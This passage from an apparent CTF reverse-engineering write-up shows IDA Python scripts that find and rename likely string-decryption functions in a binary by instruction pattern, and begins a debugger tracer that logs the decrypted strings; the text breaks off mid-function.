class="line"><span class="keyword">def</span> <span class="title function_">mnem</span>(<span class="params">ea</span>):</span><br><span class="line">    s = idc.print_insn_mnem(ea)</span><br><span class="line">    <span class="keyword">return</span> s.lower() <span class="keyword">if</span> s <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">op</span>(<span class="params">ea, n</span>):</span><br><span class="line">    s = idc.print_operand(ea, n)</span><br><span class="line">    <span class="keyword">return</span> s.lower() <span class="keyword">if</span> s <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">optype</span>(<span class="params">ea, n</span>):</span><br><span class="line">    <span class="keyword">return</span> idc.get_operand_type(ea, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prev_sig_insn</span>(<span class="params">ea, max_skip=<span class="number">8</span></span>):</span><br><span class="line">    p = prev_insn(ea)</span><br><span class="line">    skipped = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> p != idc.BADADDR <span class="keyword">and</span> skipped &lt; max_skip <span class="keyword">and</span> mnem(p) <span class="keyword">in</span> IGNORED_MNEMS:</span><br><span class="line">        p = prev_insn(p)</span><br><span class="line">        skipped += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_mov_reg_imm</span>(<span class="params">ea, regname</span>):</span><br><span class="line">    <span class="keyword">if</span> mnem(ea) != <span class="string">&quot;mov&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> op(ea, <span class="number">0</span>) != regname:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> optype(ea, <span class="number">1</span>) == idc.o_imm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_lea_rcx_mem</span>(<span class="params">ea</span>):</span><br><span class="line">    <span class="keyword">if</span> mnem(ea) != <span class="string">&quot;lea&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> op(ea, <span class="number">0</span>) != <span class="string">&quot;rcx&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    t = optype(ea, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> t <span class="keyword">in</span> (idc.o_displ, idc.o_phrase, idc.o_mem)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_mov_stack_imm</span>(<span class="params">ea</span>):</span><br><span class="line">    <span class="keyword">if</span> mnem(ea) != <span class="string">&quot;mov&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> optype(ea, <span class="number">1</span>) != idc.o_imm:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    dst = op(ea, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;[&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dst <span class="keyword">or</span> <span class="string">&quot;]&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dst:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;rsp&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dst <span class="keyword">and</span> <span class="string">&quot;rbp&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> dst:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_contiguous_stack_mov_imm</span>(<span class="params">start_ea</span>):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    ea = start_ea</span><br><span class="line">    steps = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> ea != idc.BADADDR <span class="keyword">and</span> steps &lt; MAX_BACK_INSNS:</span><br><span class="line">        cur_m = mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> cur_m <span class="keyword">in</span> IGNORED_MNEMS:</span><br><span class="line">            ea = prev_insn(ea)</span><br><span class="line">            steps += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> is_mov_stack_imm(ea):</span><br><span class="line">            immv = idc.get_operand_value(ea, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= immv &lt;= <span class="number">0x1000</span>:</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">                ea = prev_insn(ea)</span><br><span class="line">                steps += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_func_size_at</span>(<span class="params">ea</span>):</span><br><span class="line">    f = ida_funcs.get_func(ea)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> f:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> (f.end_ea - f.start_ea), f</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_candidate_call</span>(<span class="params">call_ea</span>):</span><br><span class="line">    <span class="keyword">if</span> mnem(call_ea) != <span class="string">&quot;call&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> optype(call_ea, <span class="number">0</span>) <span class="keyword">not</span> <span class="keyword">in</span> (idc.o_near, idc.o_far):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    target = idc.get_operand_value(call_ea, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> target <span class="keyword">in</span> (idc.BADADDR, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    fsz, f = get_func_size_at(target)</span><br><span class="line">    <span class="keyword">if</span> f <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (FUNC_SIZE_MIN &lt;= fsz &lt;= FUNC_SIZE_MAX):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">False</span></span><br><span class="line">    prev_raw = prev_insn(call_ea)</span><br><span class="line">    has_vzu = (prev_raw != idc.BADADDR <span class="keyword">and</span> mnem(prev_raw) == <span class="string">&quot;vzeroupper&quot;</span>)</span><br><span class="line">    e1 = prev_sig_insn(call_ea)</span><br><span class="line">    e2 = prev_sig_insn(e1)</span><br><span class="line">    e3 = prev_sig_insn(e2)</span><br><span class="line">    e4 = prev_sig_insn(e3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> idc.BADADDR <span class="keyword">in</span> (e1, e2, e3, e4):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    order_ok = (</span><br><span class="line">        (is_mov_reg_imm(e1, <span class="string">&quot;r9d&quot;</span>) <span class="keyword">and</span> is_mov_reg_imm(e2, <span class="string">&quot;r8d&quot;</span>)) <span class="keyword">or</span></span><br><span class="line">        (is_mov_reg_imm(e1, <span class="string">&quot;r8d&quot;</span>) <span class="keyword">and</span> is_mov_reg_imm(e2, <span class="string">&quot;r9d&quot;</span>))</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> order_ok:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_lea_rcx_mem(e3):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_mov_stack_imm(e4):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    chain = count_contiguous_stack_mov_imm(e4)</span><br><span class="line">    <span class="keyword">if</span> chain &lt; MIN_MOV_CHAIN:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, target, has_vzu</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">iter_exec_segs</span>():</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">        seg = ida_segment.getseg(s)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> seg:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> seg.perm &amp; ida_segment.SEGPERM_EXEC:</span><br><span class="line">            <span class="keyword">yield</span> seg.start_ea, seg.end_ea</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    candidates = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> start, end <span class="keyword">in</span> iter_exec_segs():</span><br><span class="line">        ea = start</span><br><span class="line">        <span class="keyword">while</span> ea != idc.BADADDR <span class="keyword">and</span> ea &lt; end:</span><br><span class="line">            ok, target, has_vzu = is_candidate_call(ea)</span><br><span class="line">            <span class="keyword">if</span> ok:</span><br><span class="line">                <span class="keyword">if</span> target <span class="keyword">not</span> <span class="keyword">in</span> candidates:</span><br><span class="line">                    candidates[target] = &#123;<span class="string">&quot;calls&quot;</span>: [], <span class="string">&quot;has_vzu&quot;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">                candidates[target][<span class="string">&quot;calls&quot;</span>].append(ea)</span><br><span class="line">                candidates[target][<span class="string">&quot;has_vzu&quot;</span>] = candidates[target][<span class="string">&quot;has_vzu&quot;</span>] <span class="keyword">or</span> has_vzu</span><br><span class="line">            ea = idc.next_head(ea, end)</span><br><span class="line"></span><br><span class="line">    targets = <span class="built_in">sorted</span>(candidates.keys())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] matched targets: <span class="subst">&#123;<span class="built_in">len</span>(targets)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    renamed = []</span><br><span class="line">    <span class="keyword">for</span> i, t <span class="keyword">in</span> <span class="built_in">enumerate</span>(targets):</span><br><span class="line">        new_name = <span class="string">f&quot;decstr_<span class="subst">&#123;i:02d&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        ok = ida_name.set_name(t, new_name, ida_name.SN_NOWARN | ida_name.SN_NOCHECK)</span><br><span class="line">        <span class="keyword">if</span> ok:</span><br><span class="line">            renamed.append((t, new_name, <span class="built_in">len</span>(candidates[t][<span class="string">&quot;calls&quot;</span>]), candidates[t][<span class="string">&quot;has_vzu&quot;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> cs <span class="keyword">in</span> candidates[t][<span class="string">&quot;calls&quot;</span>]:</span><br><span class="line">            old = idc.get_cmt(cs, <span class="number">0</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            extra = <span class="string">&quot; +vzu&quot;</span> <span class="keyword">if</span> candidates[t][<span class="string">&quot;has_vzu&quot;</span>] <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            tag = <span class="string">f&quot;[dec-candidate<span class="subst">&#123;extra&#125;</span> -&gt; <span class="subst">&#123;new_name&#125;</span>]&quot;</span></span><br><span class="line">            <span class="keyword">if</span> tag <span class="keyword">not</span> <span class="keyword">in</span> old:</span><br><span class="line">                idc.set_cmt(cs, (old + <span class="string">&quot; &quot;</span> + tag).strip(), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t, n, c, hv <span class="keyword">in</span> renamed:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;n&#125;</span> @ 0x<span class="subst">&#123;t:X&#125;</span>, xrefs=<span class="subst">&#123;c&#125;</span>, has_vzeroupper=<span class="subst">&#123;hv&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ida_kernwin.msg(<span class="string">&quot;[done] rename dec candidates finished.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>Then trace all the strings:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> ida_dbg</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"></span><br><span class="line">AUTO_CONTINUE = <span class="literal">True</span></span><br><span class="line">MAX_STR_READ = <span class="number">0x400</span></span><br><span class="line">MIN_PRINTABLE_LEN = <span class="number">3</span></span><br><span class="line">LOG_PATH = <span class="string">r&quot;E:/CTF/temp/dec_trace.log&quot;</span></span><br><span class="line">g_dec_trace_hooks = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_reg</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> ida_dbg.get_reg_val(name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg_read_bytes</span>(<span class="params">addr, sz</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> addr <span class="keyword">or</span> addr &lt; <span class="number">0x1000</span> <span class="keyword">or</span> sz &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        b = idc.read_dbg_memory(addr, sz)</span><br><span class="line">        <span class="keyword">if</span> b:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(b, <span class="built_in">str</span>):</span><br><span class="line">                b = b.encode(<span class="string">&quot;latin-1&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(b) &gt;= sz:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">bytes</span>(b[:sz])</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(ida_dbg, <span class="string">&quot;read_dbg_memory&quot;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            b = ida_dbg.read_dbg_memory(addr, sz)</span><br><span class="line">            <span class="keyword">if</span> b:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(b, <span class="built_in">str</span>):</span><br><span class="line">                    b = b.encode(<span class="string">&quot;latin-1&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(b) &gt;= sz:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">bytes</span>(b[:sz])</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(sz):</span><br><span class="line">            v = idc.read_dbg_byte(addr + i)</span><br><span class="line">            <span class="keyword">if</span> v <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> v &lt; <span class="number">0</span> <span class="keyword">or</span> v &gt; <span class="number">0xFF</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            out.append(v &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg_read_qword</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> addr <span class="keyword">or</span> addr &lt; <span class="number">0x1000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        q = idc.read_dbg_qword(addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(q, <span class="built_in">int</span>) <span class="keyword">and</span> <span class="number">0</span> &lt;= q &lt;= <span class="number">0xFFFFFFFFFFFFFFFF</span> <span class="keyword">and</span> q != idc.BADADDR:</span><br><span class="line">            <span class="keyword">return</span> q</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    b = dbg_read_bytes(addr, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> b <span class="keyword">or</span> <span class="built_in">len</span>(b) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;&lt;Q&quot;</span>, b)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_printable_ascii_text</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s <span class="keyword">or</span> <span class="built_in">len</span>(s) &lt; MIN_PRINTABLE_LEN:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    good = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        o = <span class="built_in">ord</span>(ch)</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> <span class="string">&quot;\r\n\t&quot;</span> <span class="keyword">or</span> (<span class="number">32</span> &lt;= o &lt;= <span class="number">126</span>):</span><br><span class="line">            good += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (good / <span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">len</span>(s))) &gt;= <span class="number">0.80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_cstr_ascii</span>(<span class="params">addr, maxlen=MAX_STR_READ</span>):</span><br><span class="line">    b = dbg_read_bytes(addr, maxlen)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> b:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    part = b.split(<span class="string">b&quot;\x00&quot;</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; MIN_PRINTABLE_LEN:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> enc <span class="keyword">in</span> (<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;latin-1&quot;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = part.decode(enc, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> is_printable_ascii_text(s):</span><br><span class="line">                <span class="keyword">return</span> s</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_cstr_utf16le</span>(<span class="params">addr, max_bytes=MAX_STR_READ</span>):</span><br><span class="line">    <span class="keyword">if</span> max_bytes % <span class="number">2</span>:</span><br><span class="line">        max_bytes += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    b = dbg_read_bytes(addr, max_bytes)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> b <span class="keyword">or</span> <span class="built_in">len</span>(b) &lt; <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    end = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> 